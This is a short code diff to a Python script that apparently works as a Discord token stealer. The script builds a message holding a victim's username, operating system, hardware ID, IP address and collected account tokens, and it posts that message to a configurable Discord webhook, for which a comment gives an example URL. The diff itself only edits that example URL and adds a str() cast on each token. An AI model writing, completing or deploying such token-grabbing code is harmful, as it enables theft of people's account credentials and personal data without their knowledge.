@@ -8,7 +8,7 @@ import json, re
 
 #put the webhook url inside the ""
 #for example
-#webhook = "https://discord.com/api/webhooks/857964923979563039/gjYn2-kRwjMt9WyHOni32ry4lYQCLNU6UFrbdTdAatSGGeuNUBlwXRW9ZTMXhBPhR78328"
+#webhook = "https://discord.com/api/webhooks/857964923979563039/gjYn2-kRwjMt9WyHOni32ry4lYQCLNU6UFrbdTdAatSGGeuNUBlwXRW9ZTMXhBPhRS3K"
 webhook = ""
 
 
@@ -61,7 +61,7 @@ def get_hwid():
 def construct_message(system_info, hwid, tokens, ip):
     final = f"Username **{system_info[1]}** using **{system_info[0][0]}**, version **{system_info[0][1]}** has logged in from **{ip}**.\nHardware ID: **{hwid}**\nTokens:"
     for token in tokens:
-        final += "\n**" + token + "**"
+        final += "\n**" + str(token) + "**"
 
     final += "\n" + "*" + "="*50 + "*"
     
